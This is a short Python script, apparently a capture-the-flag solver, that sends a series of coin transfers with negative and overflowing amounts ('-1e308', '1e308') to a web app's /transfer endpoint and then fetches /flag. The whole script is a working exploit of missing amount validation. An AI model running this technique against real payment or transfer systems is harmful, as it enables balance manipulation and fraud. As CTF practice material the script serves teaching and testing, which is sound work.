import sys
import requests

if len(sys.argv) != 2:
    print("Uso: python3 solver.py <URL_BASE>")
    print("Ejemplo: python3 solver.py http://example.com:5000")
    sys.exit(1)

BASE_URL = sys.argv[1].rstrip("/")  # Asegura que no termine en "/"

session = requests.Session()  # Mantiene cookies (JWT)

session.get(f"{BASE_URL}/")

transfers = [
    ("miguelitoCoin", "nocheNNCoin", "-1e308"),
    ("miguelitoCoin", "navajaCoin", "-1e308"),
    ("miguelitoCoin", "navajaCoin", "1e308"),
    ("miguelitoCoin", "navajaCoin", "1e308"),
    ("miguelitoCoin", "nocheNNCoin", "1e308"),
    ("miguelitoCoin", "nocheNNCoin", "1e308"),
]

for source, target, amount in transfers:
    resp = session.post(f"{BASE_URL}/transfer", json={
        "source": source,
        "target": target,
        "amount": amount
    })
    print(resp.text)

# Ahora intentar obtener el FLAG
flag_resp = session.get(f"{BASE_URL}/flag")
print(flag_resp.text)
